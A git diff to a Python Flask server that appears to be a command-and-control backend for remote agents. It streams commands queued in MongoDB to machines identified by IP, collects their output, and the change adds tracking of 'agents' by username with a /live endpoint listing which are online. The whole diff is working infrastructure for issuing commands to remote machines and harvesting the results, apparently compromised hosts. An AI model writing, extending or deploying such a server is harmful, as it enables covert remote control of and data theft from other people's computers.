@@ -1,6 +1,5 @@
 from gevent import monkey
-monkey.patch_all()  # MUST remain at line 1
-
+monkey.patch_all()
 import time
 import os
 import base64
@@ -9,8 +8,6 @@ from pymongo import MongoClient
 
 app = Flask(__name__)
 
-# --- DATABASE LAZY INITIALIZATION ---
-# This prevents the recursion depth error by delaying the connection
 class MongoHelper:
     _db = None
 
@@ -28,43 +25,56 @@ class MongoHelper:
                 return None
         return cls._db
 
+active_agents = {}
 # --- ROUTES ---
 
 @app.route("/")
 def home():
     return jsonify({"status": "running"}), 200
 
-@app.route('/api/<ip>', methods=['GET'])
-def check_command(ip):
+@app.route('/api/<ip>/<username>', methods=['GET'])
+def check_command(ip, username):
     db = MongoHelper.get_db()
     print(f"Checking for commands for IP: {ip.strip()}")
 
+    active_agents[ip.strip()] = {
+            "username": username,
+            "last_seen": time.strftime("%H:%M:%S"),
+            "status": "Online"
+        }
+    print(f"[*] Agent Joined: {username} ({ip})")
     def check_db_for_command():
         last_check = time.time()
-        while True:
-            try:
-                # Use the localized db instance
-                command = db.commands.find_one_and_delete({"target_ip": ip.strip()})
-                
-                if command:
-                    data = {
-                        "command": command['command'],
-                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-                    }
-                    yield f"data: {json.dumps(data)}\n\n"
-                    last_check = time.time()
-                
-                # Heartbeat for Render (15s interval)
-                current_time = time.time()
-                if current_time - last_check >= 15:
-                    yield f": heartbeat\n\n"
-                    last_check = current_time
-                
-                time.sleep(2) 
-                
-            except Exception as e:
-                print(f"SSE Error: {e}")
-                time.sleep(5)
+        try:
+            while True:
+                try:
+                    # Use the localized db instance
+                    command = db.commands.find_one_and_delete({"target_ip": ip.strip()})
+                    
+                    if command:
+                        data = {
+                            "command": command['command'],
+                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        yield f"data: {json.dumps(data)}\n\n"
+                        last_check = time.time()
+                    
+                    # Heartbeat for Render (15s interval)
+                    current_time = time.time()
+                    if current_time - last_check >= 15:
+                        yield f": heartbeat\n\n"
+                        last_check = current_time
+                    
+                    time.sleep(2) 
+                    
+                except Exception as e:
+                    print(f"SSE Error: {e}")
+                    time.sleep(5)
+        finally:
+            # Update last_seen for the agent
+            if ip.strip() in active_agents:
+                del active_agents[ip.strip()]
+                print(f"[-] Agent Offline: {username} ({ip})")
 
     return Response (
         check_db_for_command(),
@@ -106,6 +116,10 @@ def receive_output(ip):
     
     db.output.insert_one(output_json_data)
     return jsonify({"status": "success"}), 200
+
+@app.route('/live')
+def view_live_agents():
+    return jsonify(active_agents)
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
